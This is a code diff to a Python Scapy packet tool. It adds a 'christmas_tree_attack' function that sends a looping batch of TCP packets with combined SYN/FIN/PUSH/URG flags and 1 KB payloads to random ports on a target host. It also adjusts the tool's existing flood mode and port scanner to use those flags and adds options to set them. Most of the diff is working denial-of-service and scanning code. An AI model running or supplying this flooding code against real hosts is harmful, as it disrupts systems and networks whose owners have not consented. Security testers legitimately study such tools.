@@ -10,7 +10,7 @@ import socket
 # --Globals--
 flood = False
 scan = False
-flags = "R"
+flags = []
 ports = "0"
 target = ""
 
@@ -18,23 +18,39 @@ def main():
     #configure_ports()
 
     if scan:
-        # Todo
         port_scan()
-    if flood:
+    elif flood:
         send_flood()
-    # Todo
-    # send_packet
+    else:
+        christmas_tree_attack()
+
+def christmas_tree_attack():
+    packets = []
+    attack_flags = "".join(i for i in flags)
+    packet = IP(dst=target, ttl=64)/\
+             TCP(sport=RandShort(), flags=attack_flags, dport=random.randint(0, 65535), seq=random.randint(200000000, 500000000))/\
+             Raw(b"X"*1024)
+    for i in range(200):
+        packets.append(packet)
+    send(packets, loop=1, verbose=0)
+    print("\n")
+    # Exit
+    sys.exit(0)
+
 
 def send_flood():
     print("In flood mode, no replies will be shown")
+    attack_flags = "".join(i for i in flags)
     # Send packet in loop until ctrl+c is pressed
     send(IP(dst=target, ttl=64)
-         /TCP(sport=RandShort(), flags=flags, dport=int(ports), seq=random.randint(200000000,500000000))
+         /TCP(sport=RandShort(), flags=attack_flags, dport=int(ports), seq=random.randint(200000000,500000000))
          /Raw(b"X"*1024), loop=1, verbose=0)
+    print("\n")
     # Exit
     sys.exit(0)
 
 def port_scan():
+    attack_flags = "".join(i for i in flags)
     no_response = []
     recv_response = []
     ports_arr = []
@@ -45,7 +61,7 @@ def port_scan():
     print("|port| serv name |  flags  |ttl| id  | win | len |");
     print("+----+-----------+---------+---+-----+-----+-----+");
     for port in ports_arr:
-        scan_response = sr1(IP(dst=target, ttl=64)/TCP(sport=RandShort(), dport=port, flags=flags), verbose=0)
+        scan_response = sr1(IP(dst=target, ttl=64)/TCP(sport=RandShort(), dport=port, flags=attack_flags), verbose=0)
         if scan_response is not None:
             if scan_response.haslayer(TCP):
                 if scan_response[TCP].flags == 0x12:
@@ -74,14 +90,10 @@ def port_scan():
             no_response.append(port)
 
 
-
-def configure_ports():
+def parse_ports():
     # Todo
     pass
 
-def send_packet():
-    # Todo
-    pass
 
 def usage():
     txt = """\nWelcome! Usage can be seen below. If you
@@ -98,7 +110,7 @@ wish stop a request, press ctrl + c"""
 def process_args():
     global flood, target, scan, ports, flags
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "h8:Sp:", ["help", "flood", "syn", "destport=", "scan="])
+        opts, args = getopt.getopt(sys.argv[1:], "h8:SFPUp:", ["help", "flood", "syn", "fin", "push", "urg", "destport=", "scan="])
     except getopt.GetoptError as err:
         # print help information and exit:
         print(err)  # will print something like "option -a not recognized"
@@ -109,18 +121,23 @@ def process_args():
         elif option == "--flood":
             flood = True
         elif option in ("-S", "--syn"):
-            flags = "S"
+            flags.append("S")
+        elif option in ("-F", "--fin"):
+            flags.append("F")
+        elif option in ("-P", "--push"):
+            flags.append("P")
+        elif option in ("-U", "--urg"):
+            flags.append("U")
         elif option in ("-p", "--destport"):
             ports = argument
         elif option in ("-8", "--scan"):
             scan = True
             ports = argument
-
         else:
             assert False, "unhandled option"
     if len(args) != 1:
         print(args)
-        print("Must specify a single host!")
+        print("Must specify a single host after the options!")
         sys.exit(1)
     else:
         target = args[0]
